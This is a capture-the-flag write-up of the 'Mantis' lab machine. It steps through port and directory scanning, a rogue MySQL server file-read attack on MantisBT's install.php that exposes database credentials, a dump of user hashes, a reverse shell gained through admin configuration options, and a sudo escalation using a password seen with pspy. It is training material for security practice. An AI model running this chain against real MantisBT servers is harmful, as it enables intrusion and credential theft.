# Mantis

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 4000 -Pn 192.168.201.204
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-08 15:54 +08
Nmap scan report for 192.168.201.204
Host is up (0.17s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
3306/tcp open  mysql
```

I did a detailed scan on these ports:

```
$ sudo nmap -p 80,3306 -sC -sV --min-rate 4000 192.168.201.204     
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-08 15:56 +08
Nmap scan report for 192.168.201.204
Host is up (0.18s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Slick - Bootstrap 4 Template
3306/tcp open  mysql   MySQL 5.5.5-10.3.34-MariaDB-0ubuntu0.20.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.34-MariaDB-0ubuntu0.20.04.1
|   Thread ID: 37
|   Capabilities flags: 63486
|   Some Capabilities: IgnoreSigpipes, Speaks41ProtocolOld, SupportsTransactions, DontAllowDatabaseTableColumn, Support41Auth, LongColumnFlag, FoundRows, IgnoreSpaceBeforeParenthesis, ConnectWithDatabase, InteractiveClient, Speaks41ProtocolNew, SupportsLoadDataLocal, ODBCClient, SupportsCompression, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: E!sB/b!zhxE.VGAOJd;9
|_  Auth Plugin Name: mysql_native_password
```

### Web Enumeration

Port 80 hosted a static page:

<figure><img src="../../../.gitbook/assets/image (571).png" alt=""><figcaption></figcaption></figure>

I ran a `gobuster` on this website, and it did find a few directories of interest:

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.201.204/ -t 100
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.201.204/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2023/07/08 15:57:35 Starting gobuster in directory enumeration mode
===============================================================
/css                  (Status: 301) [Size: 316] [--> http://192.168.201.204/css/]
/js                   (Status: 301) [Size: 315] [--> http://192.168.201.204/js/]
/fonts                (Status: 301) [Size: 318] [--> http://192.168.201.204/fonts/]
/bugtracker           (Status: 301) [Size: 323] [--> http://192.168.201.204/bugtracker/]
```

`/bugtracker` looks interesting. It brought me to a login page stating that the admin directory is a security risk.&#x20;

<figure><img src="../../../.gitbook/assets/image (953).png" alt=""><figcaption></figcaption></figure>

I tried to access the `/admin` panel but it didn't work. I took a look at the Github repository for this software and tried to access the other files within the admin panel, which worked:

{% embed url="https://github.com/mantisbt/mantisbt" %}

<figure><img src="../../../.gitbook/assets/image (757).png" alt=""><figcaption></figcaption></figure>

At the bottom of the page, there are options to Upgrade the SQL database:

<figure><img src="../../../.gitbook/assets/image (951).png" alt=""><figcaption></figcaption></figure>

If we just click on the Install button without filling in any details, we are brought to another page:

<figure><img src="../../../.gitbook/assets/image (1165).png" alt=""><figcaption></figcaption></figure>

There's a configuration file mentioned at the bottom of the page, and it also shows that the web page is able to interact with the SQL instance.&#x20;

### Rogue MySQL LFI --> MySQL Creds

I did a lot more reading about `install.php` and the other components related to SQL (because SQL is publicly facing for some reason) of the admin panel and came across this CVE:

{% embed url="https://mantisbt.org/bugs/view.php?id=23173" %}

This involves using a Rogue SQL server to exploit an LFI:

{% embed url="https://github.com/allyshka/Rogue-MySql-Server/blob/master/roguemysql.php" %}

We just have to visit `install.php?install=3&hostname=192.168.45.191` to run it, and it works!

<figure><img src="../../../.gitbook/assets/image (119).png" alt=""><figcaption></figcaption></figure>

We can use this to read the `config_inc.php` file mentioned earlier:

```
$ php sql.php
Enter filename to get [/etc/passwd] > /var/www/html/bugtracker/config/config_inc.php
[.] Waiting for connection on 0.0.0.0:3306
[+] Connection from 192.168.201.204:47156 - greet... auth ok... some shit ok... want file... 
[+] /var/www/html/bugtracker/config/config_inc.php from 192.168.201.204:47156:
<?php
$g_hostname               = 'localhost';
$g_db_type                = 'mysqli';
$g_database_name          = 'bugtracker';
$g_db_username            = 'root';
$g_db_password            = 'SuperSequelPassword';

$g_default_timezone       = 'UTC';

$g_crypto_master_salt     = 'OYAxsrYFCI+xsFw3FNKSoBDoJX4OG5aLrp7rVmOCFjU=';
```

This grants us the MySQL creds, which we can use to login:

<figure><img src="../../../.gitbook/assets/image (182).png" alt=""><figcaption></figcaption></figure>

### Bugtracker Creds --> RCE

With access to the database, we can view the password of the administrator of the MantisBT instance.&#x20;

```
MariaDB [bugtracker]> select * from mantis_user_table;
+----+---------------+----------+-------------------+----------------------------------+---------+-----------+--------------+-------------+-----------------------------+--------------------+------------------------------------------------------------------+------------+--------------+
| id | username      | realname | email             | password                         | enabled | protected | access_level | login_count | lost_password_request_count | failed_login_count | cookie_string                                                    | last_visit | date_created |
+----+---------------+----------+-------------------+----------------------------------+---------+-----------+--------------+-------------+-----------------------------+--------------------+------------------------------------------------------------------+------------+--------------+
|  1 | administrator |          | root@localhost    | c7870d0b102cfb2f4916ff04e47b5c6f |       1 |         0 |           90 |           5 |                           0 |                  0 | Tgl-0N5B643JKwIwNgD9s5dKRU_gdBsXawwO7p3ZaGM2ZI4gckyB84AmBRq-IFA7 | 1651296959 |   1651292492 |
|  2 | test123       |          | test123@gmail.com | 3a85acb13b850e7b8e2b53331becc726 |       1 |         0 |           25 |           0 |                           0 |                  1 | TORSv6oU4EXOyA4cqXXgBod5RJ3vY445ArdZ9uS795NfqWdsKib7OMQGfiMOUAbp | 1688803375 |   1688803375 |
+----+---------------+----------+-------------------+----------------------------------+---------+-----------+--------------+-------------+-----------------------------+--------------------+------------------------------------------------------------------+------------+--------------+
```

This hash can be cracked on CrackStation:

<figure><img src="../../../.gitbook/assets/image (108).png" alt=""><figcaption></figcaption></figure>

Now, there are RCE exploits for this, but the one from `searchsploit` also abuses another exploit to do with password resetting for the administrator user.

First of all, that doesn't seem to work for this machine, and secondly, we already have the administrator password. In this case, I manually exploited the machine while using the PoC as a guideline.&#x20;

We can first login as the administrator:

<figure><img src="../../../.gitbook/assets/image (3846).png" alt=""><figcaption></figcaption></figure>

Then, head to `/bugtracker/adm_config_report.php` and create the following Configuration Options:

<figure><img src="../../../.gitbook/assets/image (566).png" alt=""><figcaption></figcaption></figure>

Then, just visit `/bugtracker/workflow_graph_img.php`, and we will receive a reverse shell:

<figure><img src="../../../.gitbook/assets/image (773).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Pspy Mantis Creds --> Root

We can grab the user flag from the user `mantis`. Afterwards, we can find some interesting files within their home directory:

```
www-data@mantis:/home/mantis/db_backups$ ls -la
total 52
drwxr-xr-x 2 mantis mantis  4096 Jan 30 16:15 .
drwxr-xr-x 3 mantis mantis  4096 May 17  2022 ..
-rw-rw-r-- 1 mantis mantis 37130 Jul  8 08:44 1652766150.sql
-rwx------ 1 mantis mantis   104 May 17  2022 backup.sh
```

The file was recently edited, so I ran `pspy64` on the machine to see what `backup.sh` was doing.

```
2023/07/08 08:46:01 CMD: UID=1000 PID=5746   | /bin/sh -c bash /home/mantis/db_backups/backup.sh                                                                                          
2023/07/08 08:46:01 CMD: UID=1000 PID=5745   | /bin/sh -c bash /home/mantis/db_backups/backup.sh                                                                                          
2023/07/08 08:46:01 CMD: UID=1000 PID=5747   | mysqldump -u bugtracker -pBugTracker007 bugtracker
```

There was a password present. Using that, we can `su` to `mantis`, who can run `sudo` on everything without a password.

<figure><img src="../../../.gitbook/assets/image (1760).png" alt=""><figcaption></figcaption></figure>

Rooted!
